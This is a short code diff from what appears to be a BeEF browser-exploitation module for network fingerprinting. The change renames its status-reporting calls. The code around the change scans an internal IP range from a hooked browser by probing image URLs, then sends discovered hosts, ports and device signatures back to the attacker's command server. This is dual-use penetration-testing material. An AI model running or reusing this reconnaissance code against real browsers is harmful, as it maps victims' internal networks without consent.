@@ -42,7 +42,7 @@ beef.execute(function() {
     // set target IP range
     var range = ipRange.match('^([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\-([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))\.([0-9]|[1-9][0-9]|1([0-9][0-9])|2([0-4][0-9]|5[0-5]))$');
     if (range == null || range[1] == null) {
-      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.are.status_error());
+      beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=malformed IP range supplied", beef.status.error());
       return;
     }
     // ipRange will be in the form of 192.168.0.1-192.168.0.254
@@ -300,7 +300,7 @@ beef.execute(function() {
     img.onerror = function() { dom.removeChild(this); }
     img.onload = function() {
       if (this.width == urls[this.id][5] && this.height == urls[this.id][6]) {
-        beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+'&discovered='+signature_name+"&url="+escape(this.src), beef.are.status_success());dom.removeChild(this);
+        beef.net.send('<%= @command_url %>', <%= @command_id %>,'proto='+proto+'&ip='+ip+'&port='+port+'&discovered='+signature_name+"&url="+escape(this.src), beef.status.success());dom.removeChild(this);
         beef.debug("[Network Fingerprint] Found [" + signature_name + "] with URL [" + escape(this.src) + "]");
       }
     }
